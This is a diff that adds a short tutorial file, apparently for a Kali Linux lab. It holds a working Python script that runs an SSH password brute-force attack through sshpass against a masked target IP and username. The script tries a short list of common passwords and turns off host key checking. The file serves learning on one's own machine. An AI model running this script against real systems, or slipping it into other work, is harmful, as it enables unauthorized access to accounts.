@@ -1,0 +1,44 @@
+#Create Your Python Script File
+In your terminal, type: nano bruteforce_python.py (you may give anything instead bruteforce_python)
+
+Python3 Installation Reminder
+Before running the Python brute force scripts, ensure Python 3 is installed on your Kali Linux machine:
+note: line 8 to line 44 are the pythone script....
+
+import subprocess
+import time
+# Target configuration
+target_ip = "192.168.##.##"  # IP of your Kali machine
+username = "######"          # Username on your Kali machine
+
+# List of test passwords
+passwords = [
+    "toor", "kalyi", "123456", "jfojeljd", "root", "password", "letmein"
+]
+
+print(f"\n[*] Starting SSH brute-force attack on {target_ip} with username '{username}'\n")
+
+for attempt, password in enumerate(passwords, 1):
+    print(f"[{attempt}/{len(passwords)}] Trying password: '{password}'...")
+
+    try:
+        # Attempt SSH login using sshpass
+        result = subprocess.run(
+            ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
+             f"{username}@{target_ip}", "exit"],
+            capture_output=True, text=True, timeout=10
+        )
+
+        if result.returncode == 0:
+            print(f"\n[+] SUCCESS! Password found: '{password}' ✅\n")
+            break
+        else:
+            print("[-] Failed.")
+        time.sleep(1)  # delay to avoid fast brute force
+
+    except subprocess.TimeoutExpired:
+        print("[!] Timeout reached. Skipping...\n")
+    except Exception as e:
+        print(f"[!] Unexpected error: {e}\n")
+else:
+    print("\n[-] Tried all passwords. No valid password found.\n")
